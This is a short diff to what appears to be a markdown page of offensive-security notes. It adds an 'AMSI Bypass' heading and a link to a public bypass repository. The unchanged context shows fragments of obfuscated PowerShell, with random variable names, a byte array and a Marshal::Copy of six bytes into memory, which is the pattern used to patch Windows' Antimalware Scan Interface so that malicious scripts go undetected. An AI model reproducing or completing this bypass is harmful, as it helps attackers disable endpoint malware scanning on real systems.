@@ -1,3 +1,5 @@
+# AMSI Bypass
+
 ```powershell
 $ynfhj = @"
 using System;
@@ -26,3 +28,7 @@ $uggea = [Byte[]] ($qcjh,$gbjf,$wran,$iton,+$bgml,+$fkyv)
 $mom = [System.Runtime.InteropServices.Marshal]
 $mom::Copy($uggea, 0, $veratw, 6)
 ```
+
+## References
+
+[S3cur3Th1sSh1t/Amsi-Bypass-Powershell](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell)
